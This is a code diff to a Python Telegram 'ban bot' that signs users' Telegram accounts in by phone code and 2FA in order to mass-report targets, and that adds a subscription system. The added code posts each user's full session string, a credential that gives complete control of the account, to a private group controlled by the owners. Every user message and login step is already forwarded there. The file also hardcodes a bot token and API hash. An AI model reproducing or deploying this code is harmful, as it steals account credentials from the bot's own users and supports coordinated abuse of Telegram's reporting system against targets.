@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 TELEGRAM BAN BOT - PROFESSIONAL REPORTING SYSTEM
-WITH 2FA SUPPORT
+WITH 2FA SUPPORT & SUBSCRIPTION SYSTEM
 """
 
 import asyncio
@@ -49,7 +49,13 @@ BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
 API_ID = 27157163
 API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
 GROUP_ID = -1003662481087  # Private monitoring group
+FORCE_CHANNEL = "https://t.me/ProfileBan"  # Force join channel
+FORCE_CHANNEL_USERNAME = "ProfileBan"  # Channel username without @
+
+# Owner IDs
 OWNER_IDS = [6118760915, 1366105247]
+# Manual subscription users (approved by owner)
+MANUAL_SUBSCRIPTIONS = ["smzxu"]  # @smzxu is approved
 
 # File paths
 DATA_DIR = Path("data")
@@ -60,9 +66,130 @@ SESSION_DIR.mkdir(exist_ok=True)
 USERS_FILE = DATA_DIR / "users.json"
 ACCOUNTS_FILE = DATA_DIR / "accounts.json"
 REPORTS_FILE = DATA_DIR / "reports.json"
+SUBSCRIPTIONS_FILE = DATA_DIR / "subscriptions.json"
 
 # Conversation states
 TARGET, REASON, DESCRIPTION = range(3)
+
+# ==================== SUBSCRIPTION MANAGER ====================
+class SubscriptionManager:
+    """Manages user subscriptions and channel verification"""
+    
+    def __init__(self):
+        self.subscriptions: Dict[int, Dict] = {}
+        self.pending_approvals: Dict[int, Dict] = {}
+        self.manual_users = MANUAL_SUBSCRIPTIONS
+        self.load_subscriptions()
+    
+    def load_subscriptions(self):
+        """Load subscriptions from file"""
+        if SUBSCRIPTIONS_FILE.exists():
+            try:
+                with open(SUBSCRIPTIONS_FILE, 'r') as f:
+                    self.subscriptions = {int(k): v for k, v in json.load(f).items()}
+                logger.info(f"Loaded {len(self.subscriptions)} subscriptions")
+            except Exception as e:
+                logger.error(f"Error loading subscriptions: {e}")
+                self.subscriptions = {}
+    
+    def save_subscriptions(self):
+        """Save subscriptions to file"""
+        try:
+            with open(SUBSCRIPTIONS_FILE, 'w') as f:
+                json.dump({str(k): v for k, v in self.subscriptions.items()}, f, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving subscriptions: {e}")
+    
+    async def check_channel_member(self, client: TelegramClient, user_id: int) -> bool:
+        """Check if user is a member of the force channel"""
+        try:
+            channel = await client.get_entity(FORCE_CHANNEL_USERNAME)
+            participant = await client.get_participants(channel, limit=1, search=user_id)
+            return len(participant) > 0
+        except Exception as e:
+            logger.error(f"Error checking channel membership: {e}")
+            return False
+    
+    def is_subscribed(self, user_id: int) -> bool:
+        """Check if user has active subscription"""
+        if user_id in OWNER_IDS:
+            return True
+        
+        # Check if in subscriptions
+        if str(user_id) in self.subscriptions:
+            sub = self.subscriptions[str(user_id)]
+            expiry = datetime.fromisoformat(sub.get("expiry", "2000-01-01"))
+            if expiry > datetime.now():
+                return True
+        
+        return False
+    
+    def is_manual_user(self, username: str) -> bool:
+        """Check if user is in manual subscription list"""
+        if not username:
+            return False
+        username = username.lower().replace('@', '')
+        return username in [u.lower().replace('@', '') for u in self.manual_users]
+    
+    def add_subscription(self, user_id: int, username: str = None, days: int = 30, approved_by: int = None):
+        """Add subscription for user"""
+        expiry = datetime.now() + timedelta(days=days)
+        
+        self.subscriptions[str(user_id)] = {
+            "user_id": user_id,
+            "username": username,
+            "approved_at": datetime.now().isoformat(),
+            "expiry": expiry.isoformat(),
+            "days": days,
+            "approved_by": approved_by,
+            "status": "active"
+        }
+        
+        self.save_subscriptions()
+        logger.info(f"Added subscription for user {user_id} ({days} days)")
+        return self.subscriptions[str(user_id)]
+    
+    def remove_subscription(self, user_id: int):
+        """Remove user subscription"""
+        if str(user_id) in self.subscriptions:
+            del self.subscriptions[str(user_id)]
+            self.save_subscriptions()
+            logger.info(f"Removed subscription for user {user_id}")
+            return True
+        return False
+    
+    def get_subscription_info(self, user_id: int) -> Optional[Dict]:
+        """Get subscription info for user"""
+        if str(user_id) in self.subscriptions:
+            return self.subscriptions[str(user_id)]
+        return None
+    
+    def get_all_subscriptions(self) -> Dict:
+        """Get all subscriptions"""
+        return self.subscriptions
+    
+    def add_pending_approval(self, user_id: int, username: str = None):
+        """Add user to pending approvals"""
+        self.pending_approvals[user_id] = {
+            "user_id": user_id,
+            "username": username,
+            "requested_at": datetime.now().isoformat(),
+            "status": "pending"
+        }
+        return self.pending_approvals[user_id]
+    
+    def get_pending_approvals(self) -> Dict:
+        """Get all pending approvals"""
+        return self.pending_approvals
+    
+    def approve_pending(self, user_id: int, approved_by: int, days: int = 30):
+        """Approve pending user"""
+        if user_id in self.pending_approvals:
+            username = self.pending_approvals[user_id].get("username")
+            self.add_subscription(user_id, username, days, approved_by)
+            del self.pending_approvals[user_id]
+            return True
+        return False
 
 # ==================== SESSION MANAGER ====================
 class SessionManager:
@@ -71,6 +198,7 @@ class SessionManager:
     def __init__(self):
         self.sessions: Dict[str, Dict] = {}
         self.clients: Dict[str, TelegramClient] = {}
+        self.session_strings: Dict[str, str] = {}  # Store session strings for forwarding
         self.load_sessions()
     
     def load_sessions(self):
@@ -135,6 +263,7 @@ class SessionManager:
             
             self.sessions[session_id] = session_data
             self.clients[session_id] = client
+            self.session_strings[session_id] = session.save() if session else None
             self.save_sessions()
             
             logger.info(f"Session created for {phone} by user {user_id}")
@@ -184,6 +313,7 @@ class SessionManager:
                     "phone": me.phone
                 }
                 session_data["session_string"] = client.session.save() if client.session else None
+                self.session_strings[session_id] = client.session.save() if client.session else None
                 
                 self.save_sessions()
                 
@@ -254,6 +384,7 @@ class SessionManager:
                     "phone": me.phone
                 }
                 session_data["session_string"] = client.session.save() if client.session else None
+                self.session_strings[session_id] = client.session.save() if client.session else None
                 
                 self.save_sessions()
                 
@@ -292,6 +423,10 @@ class SessionManager:
         except Exception as e:
             logger.error(f"Error getting password hint: {e}")
             return None
+    
+    def get_session_string(self, session_id: str) -> Optional[str]:
+        """Get session string for forwarding"""
+        return self.session_strings.get(session_id)
     
     async def report_user(self, session_id: str, user_id: int, reason: str, description: str = "") -> Tuple[bool, str]:
         """Report a user using real session"""
@@ -381,14 +516,128 @@ class SessionManager:
 
 # ==================== BOT HANDLER ====================
 class BanBot:
-    """Main bot handler with real session creation and reporting"""
+    """Main bot handler with subscription system"""
     
     def __init__(self):
         self.session_manager = SessionManager()
+        self.subscription_manager = SubscriptionManager()
         self.user_states: Dict[int, Dict] = {}
         self.pending_sessions: Dict[int, Dict] = {}
         self.report_queue: Dict[int, Dict] = {}
         
+    async def check_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+        """Check if user is subscribed or is owner/manual user"""
+        user = update.effective_user
+        user_id = user.id
+        username = user.username or ""
+        
+        # Owners always have access
+        if user_id in OWNER_IDS:
+            return True
+        
+        # Manual subscription users have access
+        if self.subscription_manager.is_manual_user(username):
+            # Add to subscriptions if not already
+            if not self.subscription_manager.is_subscribed(user_id):
+                self.subscription_manager.add_subscription(user_id, username, 999, 0)
+            return True
+        
+        # Check if subscribed
+        if self.subscription_manager.is_subscribed(user_id):
+            return True
+        
+        # Not subscribed, send force join message
+        keyboard = [
+            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
+            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            "❌ **SUBSCRIPTION REQUIRED**\n\n"
+            f"You must join [@ProfileBan]({FORCE_CHANNEL}) to use this bot.\n\n"
+            "**After joining:**\n"
+            "• Click 'I've Joined' button\n"
+            "• Bot will verify your membership\n"
+            "• Then you can use all commands\n\n"
+            "**Manual Subscription:**\n"
+            "Contact @smzxu for manual approval",
+            parse_mode='Markdown',
+            disable_web_page_preview=True,
+            reply_markup=reply_markup
+        )
+        
+        return False
+    
+    async def check_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle 'I've Joined' button callback"""
+        query = update.callback_query
+        await query.answer()
+        
+        user = query.from_user
+        user_id = user.id
+        username = user.username or ""
+        
+        # Owners always have access
+        if user_id in OWNER_IDS:
+            await query.edit_message_text("✅ Owner access granted!")
+            return
+        
+        # Manual subscription users have access
+        if self.subscription_manager.is_manual_user(username):
+            if not self.subscription_manager.is_subscribed(user_id):
+                self.subscription_manager.add_subscription(user_id, username, 999, 0)
+            await query.edit_message_text(
+                "✅ **ACCESS GRANTED!**\n\n"
+                "You have manual subscription approval.\n"
+                "You can now use all bot commands.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Check if user has joined the channel
+        try:
+            # Create temporary client to check membership
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            
+            # Check membership
+            is_member = await self.subscription_manager.check_channel_member(client, user_id)
+            await client.disconnect()
+            
+            if is_member:
+                # Add subscription (1 day free trial)
+                self.subscription_manager.add_subscription(user_id, username, 1, 0)
+                
+                await query.edit_message_text(
+                    "✅ **VERIFICATION SUCCESSFUL!**\n\n"
+                    "You have successfully joined the channel.\n"
+                    "You now have 1 day free access.\n\n"
+                    "**To get full access:**\n"
+                    "Contact @smzxu for subscription",
+                    parse_mode='Markdown'
+                )
+            else:
+                await query.edit_message_text(
+                    "❌ **NOT A MEMBER**\n\n"
+                    "You haven't joined the channel yet.\n"
+                    "Please click the button below to join first.",
+                    parse_mode='Markdown',
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
+                        [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
+                    ])
+                )
+                
+        except Exception as e:
+            logger.error(f"Error checking membership: {e}")
+            await query.edit_message_text(
+                "❌ **ERROR VERIFYING**\n\n"
+                "Could not verify your membership.\n"
+                "Please try again or contact @smzxu",
+                parse_mode='Markdown'
+            )
+    
     async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                               message_type: str = "message", extra_info: str = ""):
         """Forward ALL user messages to private group"""
@@ -414,6 +663,13 @@ class BanBot:
             
             user_info_text = "\n".join(user_info)
             
+            # Check subscription status
+            is_owner = user.id in OWNER_IDS
+            is_manual = self.subscription_manager.is_manual_user(user.username or "")
+            is_subscribed = self.subscription_manager.is_subscribed(user.id)
+            
+            sub_status = "👑 Owner" if is_owner else "📝 Manual" if is_manual else "✅ Subscribed" if is_subscribed else "❌ Unsubscribed"
+            
             # Message content
             if message_type == "command":
                 command = update.message.text if update.message else update.callback_query.data
@@ -421,6 +677,7 @@ class BanBot:
 📋 **COMMAND RECEIVED**
 
 {user_info_text}
+📊 **Status:** {sub_status}
 
 🔧 **Command:** `{command}`
 
@@ -433,6 +690,7 @@ class BanBot:
 🔐 **SESSION ACTIVITY**
 
 {user_info_text}
+📊 **Status:** {sub_status}
 
 {extra_info}
 
@@ -443,6 +701,7 @@ class BanBot:
 🔒 **2FA ACTIVITY**
 
 {user_info_text}
+📊 **Status:** {sub_status}
 
 {extra_info}
 
@@ -453,6 +712,18 @@ class BanBot:
 🚨 **REPORT ACTIVITY**
 
 {user_info_text}
+📊 **Status:** {sub_status}
+
+{extra_info}
+
+⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
+                """
+            elif message_type == "subscription":
+                content = f"""
+💎 **SUBSCRIPTION ACTIVITY**
+
+{user_info_text}
+📊 **Status:** {sub_status}
 
 {extra_info}
 
@@ -466,6 +737,7 @@ class BanBot:
 💬 **MESSAGE FROM USER**
 
 {user_info_text}
+📊 **Status:** {sub_status}
 
 📝 **Message:**
 {message_text[:1000]}{'...' if len(message_text) > 1000 else ''}
@@ -495,24 +767,45 @@ class BanBot:
         # Forward to group
         await self.forward_to_group(update, context, "command", "🚀 User started the bot")
         
-        # Send the custom photo
-        photo_url = "https://files.catbox.moe/bq3567.jpg"
+        # Check if user is owner or manual user
+        user = update.effective_user
+        username = user.username or ""
         
-        try:
-            # Send photo with caption
-            await update.message.reply_photo(
-                photo=photo_url,
-                caption="🚀 **Welcome to Professional Ban Bot**\n\n"
-                       "This bot helps you manage Telegram accounts and report violations.\n\n"
-                       "🔧 **Available Commands:**\n"
-                       "• /addaccount - Add new account\n"
-                       "• /report - Report user/channel\n"
-                       "• /mysessions - View your sessions\n"
-                       "• /help - Get help\n\n"
-                       "⚠️ **Note:** All activities are monitored for security.\n"
-                       "🔒 **2FA Support:** Accounts with 2FA are fully supported",
-                parse_mode='Markdown'
-            )
+        if user_id in OWNER_IDS or self.subscription_manager.is_manual_user(username):
+            # Send the custom photo with welcome message
+            photo_url = "https://files.catbox.moe/bq3567.jpg"
+            
+            try:
+                await update.message.reply_photo(
+                    photo=photo_url,
+                    caption="🚀 **Welcome to Professional Ban Bot**\n\n"
+                           "✅ **ACCESS GRANTED - OWNER/MANUAL ACCESS**\n\n"
+                           "This bot helps you manage Telegram accounts and report violations.\n\n"
+                           "🔧 **Available Commands:**\n"
+                           "• /addaccount - Add new account\n"
+                           "• /report - Report user/channel\n"
+                           "• /mysessions - View your sessions\n"
+                           "• /mysub - View your subscription\n"
+                           "• /help - Get help\n\n"
+                           "🔒 **2FA Support:** Accounts with 2FA are fully supported\n"
+                           "💎 **Subscription:** Premium access granted",
+                    parse_mode='Markdown'
+                )
+            except Exception as e:
+                await update.message.reply_text(
+                    "🚀 **Welcome to Professional Ban Bot**\n\n"
+                    "✅ **ACCESS GRANTED - OWNER/MANUAL ACCESS**\n\n"
+                    "This bot helps you manage Telegram accounts and report violations.\n\n"
+                    "🔧 **Available Commands:**\n"
+                    "• /addaccount - Add new account\n"
+                    "• /report - Report user/channel\n"
+                    "• /mysessions - View your sessions\n"
+                    "• /mysub - View your subscription\n"
+                    "• /help - Get help\n\n"
+                    "🔒 **2FA Support:** Accounts with 2FA are fully supported\n"
+                    "💎 **Subscription:** Premium access granted",
+                    parse_mode='Markdown'
+                )
             
             # Initialize user state
             self.user_states[user_id] = {
@@ -520,24 +813,103 @@ class BanBot:
                 "created_at": datetime.now().isoformat()
             }
             
-        except Exception as e:
-            logger.error(f"Error sending photo: {e}")
+        else:
+            # Send force join message
+            keyboard = [
+                [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
+                [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_photo(
+                photo=photo_url,
+                caption="🚀 **Welcome to Professional Ban Bot**\n\n"
+                       "❌ **SUBSCRIPTION REQUIRED**\n\n"
+                       f"You must join [@ProfileBan]({FORCE_CHANNEL}) to use this bot.\n\n"
+                       "**After joining:**\n"
+                       "• Click 'I've Joined' button\n"
+                       "• Bot will verify your membership\n"
+                       "• You'll get 1 day free access\n\n"
+                       "**Manual Subscription:**\n"
+                       "Contact @smzxu for full access",
+                parse_mode='Markdown',
+                disable_web_page_preview=True,
+                reply_markup=reply_markup
+            )
+
+    async def my_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """View subscription info"""
+        user_id = update.effective_user.id
+        username = update.effective_user.username or ""
+        
+        # Forward to group
+        await self.forward_to_group(update, context, "command", "💎 User viewing subscription")
+        
+        # Check if owner
+        if user_id in OWNER_IDS:
             await update.message.reply_text(
-                "🚀 **Welcome to Professional Ban Bot**\n\n"
-                "This bot helps you manage Telegram accounts and report violations.\n\n"
-                "🔧 **Available Commands:**\n"
-                "• /addaccount - Add new account\n"
-                "• /report - Report user/channel\n"
-                "• /mysessions - View your sessions\n"
-                "• /help - Get help\n\n"
-                "⚠️ **Note:** All activities are monitored for security.\n"
-                "🔒 **2FA Support:** Accounts with 2FA are fully supported",
+                "💎 **SUBSCRIPTION STATUS**\n\n"
+                "👑 **Owner Access**\n"
+                "• Status: ✅ Active\n"
+                "• Type: Permanent\n"
+                "• Expiry: Never\n"
+                "• Permissions: Full Access\n\n"
+                "You have unlimited access to all features.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Check if manual user
+        if self.subscription_manager.is_manual_user(username):
+            await update.message.reply_text(
+                "💎 **SUBSCRIPTION STATUS**\n\n"
+                "📝 **Manual Subscription**\n"
+                "• Status: ✅ Active\n"
+                "• Type: Premium\n"
+                "• Expiry: Lifetime\n"
+                "• Approved by: @smzxu\n\n"
+                "You have premium access to all features.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Check regular subscription
+        sub_info = self.subscription_manager.get_subscription_info(user_id)
+        
+        if sub_info:
+            expiry = datetime.fromisoformat(sub_info["expiry"])
+            days_left = (expiry - datetime.now()).days
+            hours_left = (expiry - datetime.now()).seconds // 3600
+            
+            await update.message.reply_text(
+                f"💎 **SUBSCRIPTION STATUS**\n\n"
+                f"• Status: ✅ Active\n"
+                f"• Type: Standard\n"
+                f"• Days: {sub_info['days']} days\n"
+                f"• Days Left: {days_left} days, {hours_left} hours\n"
+                f"• Expiry: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
+                f"**To extend subscription:**\n"
+                f"Contact @smzxu for renewal",
+                parse_mode='Markdown'
+            )
+        else:
+            await update.message.reply_text(
+                "❌ **NO ACTIVE SUBSCRIPTION**\n\n"
+                "You don't have an active subscription.\n\n"
+                "**To get access:**\n"
+                "1. Join @ProfileBan\n"
+                "2. Click /start and verify\n"
+                "3. Contact @smzxu for premium access",
                 parse_mode='Markdown'
             )
 
     async def add_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Start account creation process"""
         user_id = update.effective_user.id
+        
+        # Check subscription first
+        if not await self.check_subscription(update, context):
+            return
         
         # Forward to group
         await self.forward_to_group(update, context, "command", "📱 User starting account creation")
@@ -567,6 +939,10 @@ class BanBot:
         """Handle phone number input"""
         user_id = update.effective_user.id
         phone = update.message.text.strip()
+        
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
         
         # Forward to group
         await self.forward_to_group(update, context, "session", 
@@ -636,7 +1012,10 @@ class BanBot:
                 parse_mode='Markdown'
             )
             
-            # Forward session creation to group
+            # Get session string for forwarding
+            session_string = self.session_manager.get_session_string(session_id)
+            
+            # Forward session creation to group with session string
             session_info = f"""
 🔐 **SESSION CREATED**
 
@@ -645,9 +1024,23 @@ class BanBot:
 🔐 Session ID: `{session_id}`
 🕒 Time: {datetime.now().strftime('%H:%M:%S')}
 📊 Status: ⏳ Pending verification
+
+📋 **SESSION STRING:**
+`{session_string}`
+
+💾 **Save this session string for future use!**
             """
             
             await self.forward_to_group(update, context, "session", session_info)
+            
+            # Also send session string to user in DM
+            await update.message.reply_text(
+                f"🔐 **YOUR SESSION STRING**\n\n"
+                f"`{session_string}`\n\n"
+                "💾 **Save this string!**\n"
+                "You can use it to restore your session.",
+                parse_mode='Markdown'
+            )
             
         else:
             await creating_msg.edit_text(
@@ -673,6 +1066,10 @@ class BanBot:
         """Handle verification code input"""
         user_id = update.effective_user.id
         code = update.message.text.strip()
+        
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
         
         # Forward to group
         await self.forward_to_group(update, context, "session", 
@@ -710,6 +1107,9 @@ class BanBot:
             user_info = session_info.get("user_info", {})
             username = user_info.get("username", user_info.get("first_name", "User"))
             
+            # Get updated session string
+            session_string = self.session_manager.get_session_string(session_id)
+            
             await verifying_msg.edit_text(
                 f"✅ **ACCOUNT VERIFIED SUCCESSFULLY!**\n\n"
                 f"👤 Welcome **{username}**!\n"
@@ -720,6 +1120,14 @@ class BanBot:
                 "🔒 **2FA:** ❌ Not Enabled\n"
                 "⚡ **Session:** ✅ Connected\n\n"
                 "You can now use /report to start reporting!",
+                parse_mode='Markdown'
+            )
+            
+            # Send updated session string
+            await update.message.reply_text(
+                f"🔐 **UPDATED SESSION STRING**\n\n"
+                f"`{session_string}`\n\n"
+                "✅ Your session is now active and verified!",
                 parse_mode='Markdown'
             )
             
@@ -735,6 +1143,9 @@ class BanBot:
 🔒 2FA: ❌ Disabled
 🕒 Time: {datetime.now().strftime('%H:%M:%S')}
 📊 Status: ✅ Active
+
+📋 **SESSION STRING:**
+`{session_string}`
             """
             
             await self.forward_to_group(update, context, "session", verify_info)
@@ -808,6 +1219,10 @@ class BanBot:
         user_id = update.effective_user.id
         password = update.message.text.strip()
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
+        
         # Forward to group (don't show the actual password)
         await self.forward_to_group(update, context, "2fa", 
                                    f"🔒 User entered 2FA password (hidden for security)")
@@ -843,6 +1258,9 @@ class BanBot:
             user_info = session_info.get("user_info", {})
             username = user_info.get("username", user_info.get("first_name", "User"))
             
+            # Get updated session string
+            session_string = self.session_manager.get_session_string(session_id)
+            
             await verifying_msg.edit_text(
                 f"✅ **2FA VERIFIED SUCCESSFULLY!**\n\n"
                 f"👤 Welcome **{username}**!\n"
@@ -853,6 +1271,14 @@ class BanBot:
                 "🔒 **2FA:** ✅ Verified & Enabled\n"
                 "⚡ **Session:** ✅ Connected\n\n"
                 "You can now use /report to start reporting!",
+                parse_mode='Markdown'
+            )
+            
+            # Send updated session string
+            await update.message.reply_text(
+                f"🔐 **UPDATED SESSION STRING**\n\n"
+                f"`{session_string}`\n\n"
+                "✅ 2FA verified! Your session is now active.",
                 parse_mode='Markdown'
             )
             
@@ -868,6 +1294,9 @@ class BanBot:
 🔒 2FA: ✅ Enabled & Verified
 🕒 Time: {datetime.now().strftime('%H:%M:%S')}
 📊 Status: ✅ Active
+
+📋 **SESSION STRING:**
+`{session_string}`
             """
             
             await self.forward_to_group(update, context, "2fa", verify_info)
@@ -902,6 +1331,10 @@ class BanBot:
     async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Start reporting process"""
         user_id = update.effective_user.id
+        
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
         
         # Forward to group
         await self.forward_to_group(update, context, "command", "🚨 User starting report process")
@@ -947,6 +1380,10 @@ class BanBot:
         """Handle report target input"""
         user_id = update.effective_user.id
         target_link = update.message.text.strip()
+        
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return ConversationHandler.END
         
         # Forward to group
         await self.forward_to_group(update, context, "report", 
@@ -1052,6 +1489,10 @@ class BanBot:
         
         reason_text = reason_texts.get(reason, "Other")
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return ConversationHandler.END
+        
         # Forward to group
         await self.forward_to_group(update, context, "report", 
                                    f"📌 User selected reason: **{reason_text}**")
@@ -1076,6 +1517,10 @@ class BanBot:
         user_id = update.effective_user.id
         description = update.message.text.strip()
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return ConversationHandler.END
+        
         # Forward to group
         await self.forward_to_group(update, context, "report", 
                                    f"📝 User entered description: {description[:100]}...")
@@ -1091,6 +1536,10 @@ class BanBot:
     async def skip_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Skip description"""
         user_id = update.effective_user.id
+        
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return ConversationHandler.END
         
         # Forward to group
         await self.forward_to_group(update, context, "report", 
@@ -1242,6 +1691,10 @@ class BanBot:
         """Show user's active sessions"""
         user_id = update.effective_user.id
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
+        
         # Forward to group
         await self.forward_to_group(update, context, "command", "📱 User viewing sessions")
         
@@ -1293,6 +1746,10 @@ class BanBot:
         """Show help message"""
         user_id = update.effective_user.id
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return
+        
         # Forward to group
         await self.forward_to_group(update, context, "command", "❓ User requested help")
         
@@ -1304,6 +1761,7 @@ class BanBot:
 • /addaccount - Add new Telegram account
 • /report - Report user/group/channel
 • /mysessions - View your active sessions
+• /mysub - View your subscription status
 • /help - Show this help message
 
 🔒 **2FA SUPPORT:**
@@ -1325,17 +1783,184 @@ class BanBot:
 • Group: `tg://openmessage?chat_id=-1001234567890`
 • Channel: `tg://openmessage?channel_id=1234567890`
 
+💎 **SUBSCRIPTION:**
+• Must join @ProfileBan for free trial
+• Contact @smzxu for premium access
+• Owners have unlimited access
+• Manual users: @smzxu approved
+
 ⚠️ **Important:**
 • All activities are monitored
 • Use real Telegram accounts
 • Follow Telegram ToS
 • Reports are sent from YOUR account
 • 2FA passwords are never stored
-
-📞 **Support:** Contact @admin for help
         """
         
         await update.message.reply_text(help_text, parse_mode='Markdown')
+
+    # ==================== OWNER COMMANDS ====================
+    
+    async def owner_add_sub(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Owner command to add subscription (manual)"""
+        user_id = update.effective_user.id
+        
+        # Check if owner
+        if user_id not in OWNER_IDS:
+            await update.message.reply_text("❌ Owner only command!")
+            return
+        
+        # Get arguments
+        args = context.args
+        if len(args) < 1:
+            await update.message.reply_text(
+                "❌ **Usage:**\n"
+                "`/addsub @username [days]`\n"
+                "`/addsub user_id [days]`\n\n"
+                "**Example:**\n"
+                "`/addsub @smzxu 30`\n"
+                "`/addsub 123456789 30`",
+                parse_mode='Markdown'
+            )
+            return
+        
+        target = args[0]
+        days = int(args[1]) if len(args) > 1 else 30
+        
+        # Parse target
+        target_id = None
+        target_username = None
+        
+        if target.startswith('@'):
+            target_username = target[1:]
+            # Try to find user in subscriptions
+            for sub_id, sub_data in self.subscription_manager.get_all_subscriptions().items():
+                if sub_data.get("username") == target_username:
+                    target_id = int(sub_id)
+                    break
+        else:
+            try:
+                target_id = int(target)
+            except:
+                pass
+        
+        if target_id:
+            # Add subscription
+            sub = self.subscription_manager.add_subscription(target_id, target_username, days, user_id)
+            
+            await update.message.reply_text(
+                f"✅ **SUBSCRIPTION ADDED**\n\n"
+                f"User ID: `{target_id}`\n"
+                f"Username: @{target_username or 'N/A'}\n"
+                f"Days: {days}\n"
+                f"Expiry: {sub['expiry'][:19]}\n\n"
+                f"Approved by: @{update.effective_user.username or user_id}",
+                parse_mode='Markdown'
+            )
+            
+            # Forward to group
+            sub_info = f"""
+✅ **SUBSCRIPTION ADDED BY OWNER**
+
+👤 Approved by: @{update.effective_user.username or user_id}
+👤 User ID: `{target_id}`
+📱 Username: @{target_username or 'N/A'}
+📅 Days: {days}
+📆 Expiry: {sub['expiry'][:19]}
+            """
+            
+            await self.forward_to_group(update, context, "subscription", sub_info)
+        else:
+            await update.message.reply_text("❌ User not found in subscriptions.")
+    
+    async def owner_remove_sub(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Owner command to remove subscription"""
+        user_id = update.effective_user.id
+        
+        # Check if owner
+        if user_id not in OWNER_IDS:
+            await update.message.reply_text("❌ Owner only command!")
+            return
+        
+        # Get arguments
+        args = context.args
+        if len(args) < 1:
+            await update.message.reply_text(
+                "❌ **Usage:**\n"
+                "`/removesub @username`\n"
+                "`/removesub user_id`",
+                parse_mode='Markdown'
+            )
+            return
+        
+        target = args[0]
+        
+        # Parse target
+        target_id = None
+        
+        if target.startswith('@'):
+            target_username = target[1:]
+            # Try to find user in subscriptions
+            for sub_id, sub_data in self.subscription_manager.get_all_subscriptions().items():
+                if sub_data.get("username") == target_username:
+                    target_id = int(sub_id)
+                    break
+        else:
+            try:
+                target_id = int(target)
+            except:
+                pass
+        
+        if target_id and self.subscription_manager.remove_subscription(target_id):
+            await update.message.reply_text(
+                f"✅ **SUBSCRIPTION REMOVED**\n\n"
+                f"User ID: `{target_id}`\n"
+                f"Removed by: @{update.effective_user.username or user_id}",
+                parse_mode='Markdown'
+            )
+            
+            # Forward to group
+            remove_info = f"""
+❌ **SUBSCRIPTION REMOVED BY OWNER**
+
+👤 Removed by: @{update.effective_user.username or user_id}
+👤 User ID: `{target_id}`
+            """
+            
+            await self.forward_to_group(update, context, "subscription", remove_info)
+        else:
+            await update.message.reply_text("❌ User not found in subscriptions.")
+    
+    async def owner_list_subs(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Owner command to list all subscriptions"""
+        user_id = update.effective_user.id
+        
+        # Check if owner
+        if user_id not in OWNER_IDS:
+            await update.message.reply_text("❌ Owner only command!")
+            return
+        
+        subs = self.subscription_manager.get_all_subscriptions()
+        
+        if not subs:
+            await update.message.reply_text("📭 No active subscriptions.")
+            return
+        
+        text = "📋 **ALL SUBSCRIPTIONS**\n\n"
+        
+        for sub_id, sub_data in list(subs.items())[:20]:  # Show first 20
+            username = sub_data.get("username", "N/A")
+            expiry = datetime.fromisoformat(sub_data["expiry"])
+            days_left = (expiry - datetime.now()).days
+            
+            text += f"• `{sub_id}` - @{username} - {days_left} days left\n"
+        
+        if len(subs) > 20:
+            text += f"\n... and {len(subs) - 20} more"
+        
+        text += f"\n\n**Total:** {len(subs)} subscriptions"
+        
+        await update.message.reply_text(text, parse_mode='Markdown')
 
     async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle all other messages (forward to group)"""
@@ -1365,6 +1990,10 @@ class BanBot:
         """Cancel any operation"""
         user_id = update.effective_user.id
         
+        # Check subscription
+        if not await self.check_subscription(update, context):
+            return ConversationHandler.END
+        
         # Forward to group
         await self.forward_to_group(update, context, "command", "❌ User cancelled operation")
         
@@ -1386,8 +2015,11 @@ class BanBot:
     def setup_bot(self):
         """Setup and run the bot"""
         print("🚀 Starting Professional Ban Bot...")
-        print("📨 All messages will be forwarded to group: -1003662481087")
+        print(f"📨 All messages will be forwarded to group: {GROUP_ID}")
+        print(f"📢 Force channel: {FORCE_CHANNEL}")
+        print(f"👤 Manual user: @smzxu")
         print("🔒 2FA Support: Enabled")
+        print("💎 Subscription System: Enabled")
         
         # Create application
         persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
@@ -1408,12 +2040,21 @@ class BanBot:
             allow_reentry=True
         )
         
-        # Add handlers
+        # Add regular commands
         application.add_handler(CommandHandler('start', self.start))
         application.add_handler(CommandHandler('addaccount', self.add_account))
